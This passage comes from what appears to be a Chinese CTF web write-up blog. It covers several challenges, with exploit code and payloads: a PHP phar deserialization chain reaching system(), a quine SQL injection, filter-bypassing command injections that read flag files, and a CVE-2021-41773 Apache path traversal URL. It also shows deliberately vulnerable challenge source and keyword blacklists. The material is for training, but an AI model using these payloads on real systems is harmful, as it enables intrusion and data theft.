class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;surprise&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;这不合理&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//此功能废弃，不想写了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filter</span>();</span><br><span class="line">        <span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$contents</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;404 not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;eval&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析下链子，最终在<code>ff</code>的<code>__get</code>下执行cmd，就要访问不可访问的成员来触发<code>__get</code>，里面正好有个private的$content，通过<code>zz</code>里的<code>__toString</code>来调用<code>write($var)</code>，而write()方法里面的<code>$lt=$this-&gt;filename-&gt;$var;</code>会访问到<code>$var</code>，控制<code>$var</code>为<code>content</code>，这个<code>$var</code>，也就是<code>content</code>，在类ff里是私有的，这个时候，尚未对<code>content</code>进行任何操作，需要进行赋值操作才会触发<code>__get</code>，那我们控制<code>$this-&gt;filename=new ff()</code>，正好，而<code>aa</code>里有个<code>strtolower</code>正好触发了<code>__toString</code>。整理下链子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aa::<span class="title function_ invoke__">strlower</span>()-&gt;zz::<span class="variable constant_">__toString</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$var</span>)-&gt;ff::<span class="title function_ invoke__">__get</span>(::<span class="variable constant_">xx</span>)</span><br><span class="line"><span class="comment">#这里的xx是赋值操作</span></span><br></pre></td></tr></table></figure>

<p>写出exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="keyword">new</span> <span class="title function_ invoke__">xx</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__constrtuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="keyword">new</span> <span class="title function_ invoke__">zz</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="keyword">new</span> <span class="title function_ invoke__">zz</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;filename=<span class="keyword">new</span> <span class="title function_ invoke__">ff</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exp.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>执行exp后会生成一个<code>exp.phar</code>，上传之后会得到txt的路径，拿去read，使用phar协议读取，传入payload</p>
<p><code>file=phar://upload/xxxxx.txt&amp;method=write&amp;var=content&amp;cmd=ls /</code></p>
<h1 id="150-HDCTF-2023-LoginMaster"><a href="#150-HDCTF-2023-LoginMaster" class="headerlink" title="150.[HDCTF 2023]LoginMaster"></a>150.[HDCTF 2023]LoginMaster</h1><p>robots.txt</p>
<p>就是75题的quine注入，payload要修改一下，在前面加个1，后面相应的位置都要加1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/REPLACE(REPLACE(&#x27;1&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)#&#x27;,CHAR(34),CHAR(39)),CHAR(66),&#x27;1&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;B&quot;,CHAR(34),CHAR(39)),CHAR(66),&quot;B&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>

<h1 id="151-FSCTF-2023-EZ-eval"><a href="#151-FSCTF-2023-EZ-eval" class="headerlink" title="151.[FSCTF 2023]EZ_eval"></a>151.[FSCTF 2023]EZ_eval</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$word</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;</span>, <span class="variable">$word</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$word</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$word</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span>. <span class="variable">$word</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:<code>?word=&lt;script%0alanguage=&#39;php&#39;&gt;system(&#39;ca\t$&#123;IFS&#125;/f*&#39;);&lt;/script&gt;</code></p>
<h1 id="152-HZNUCTF-2023-preliminary-guessguessguess"><a href="#152-HZNUCTF-2023-preliminary-guessguessguess" class="headerlink" title="152.[HZNUCTF 2023 preliminary]guessguessguess"></a>152.[HZNUCTF 2023 preliminary]guessguessguess</h1><p>会把payload倒序，需要倒序输入，输入hint可以得到三个方向，sql、xss、rce，前两项都无法getflag。</p>
<p>构造一句话会被注释，以为要绕过，用script language发现没有回显 phpinfo也没有，其实直接执行phpinfo就可以了，其他命令执行没有回显。</p>
<h1 id="153-FSCTF-2023-Hello-you"><a href="#153-FSCTF-2023-Hello-you" class="headerlink" title="153.[FSCTF 2023]Hello,you"></a>153.[FSCTF 2023]Hello,you</h1><p>F12发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行命令并返回结果</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">executeCommand</span>(<span class="params"><span class="variable">$command</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$command</span>, <span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册用户</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">registerUser</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ......... </span></span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;echo Hello, &quot;</span> . <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">executeCommand</span>(<span class="variable">$command</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理注册请求</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">registerUser</span>(<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说两句逻辑，点注册按钮就会执行<code>registerUser</code>函数，把<code>username</code>拼接到<code>command</code>，然后传入到<code>executeCommand</code>里面执行命令，再返回，所以拼接一个<code>|</code>就可以执行多条命令，试了一下flag在env里。</p>
<p>payload:<code>|env</code></p>
<h1 id="154-LitCTF-2023-彩蛋"><a href="#154-LitCTF-2023-彩蛋" class="headerlink" title="154.[LitCTF 2023]彩蛋"></a>154.[LitCTF 2023]彩蛋</h1><p>彩蛋分布于 我Flag呢 Follow me and hack me 作业管理系统 狠狠的注入 四个题目 中</p>
<p>也就是这四道题，第一道F12里执行<code>giveMeEgg()</code></p>
<p><img src="/images/image-20240103141802276.png" alt="image-20240103141802276"></p>
<p><code>LitCTF&#123;First_t0_The_k3y!</code></p>
<p>第二道题，扫目录发现<a target="_blank" rel="noopener" href="http://www.zip,第二部分/">www.zip，第二部分</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 第三个彩蛋！(看过头号玩家么？)</span></span><br><span class="line">    <span class="comment">// _R3ady_Pl4yer_000ne_ (3/?)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>_R3ady_Pl4yer_000ne_</code></p>
<p>第三道题 在备选的地址里</p>
<p><img src="/images/image-20240103143221771.png" alt="image-20240103143221771"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wow 你找到了第二个彩蛋哦~</span><br><span class="line">_S0_ne3t? (2/?)</span><br></pre></td></tr></table></figure>

<p>nss上没找到狠狠的注入这题，只能看wp了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个好像是最后一个个彩蛋</span><br><span class="line">F1rst_to_Th3_eggggggggg!&#125;</span><br></pre></td></tr></table></figure>

<p>用下划线拼接</p>
<h1 id="155-GFCTF-2021-Baby-Web"><a href="#155-GFCTF-2021-Baby-Web" class="headerlink" title="155.[GFCTF 2021]Baby_Web"></a>155.[GFCTF 2021]Baby_Web</h1><p>CVE-2021-41773</p>
<p><code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/index.php.txt</code></p>
<p>读取到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Welcome To GFCTF <span class="number">12</span>th!!&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;Class.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title class_">Temp</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取Class.php看下</p>
<p><code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/Class.php.txt</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;main&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">Class Temp&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$date</span>=[<span class="string">&#x27;version&#x27;</span>=&gt;<span class="string">&#x27;1.0&#x27;</span>,<span class="string">&#x27;img&#x27;</span>=&gt;<span class="string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTempName</span>(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listdata</span>(<span class="params"><span class="variable">$_params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$system</span> = [</span><br><span class="line">            <span class="string">&#x27;db&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;num&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sum&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;form&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;not_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;show_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;more&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;catid&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;field&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table_site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;total&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;join&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;return&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sbpage&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;urlrule&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagesize&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagefile&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$param</span> = <span class="variable">$where</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_params</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$params</span>[<span class="number">0</span>], [<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$params</span>[<span class="number">0</span>] = <span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) 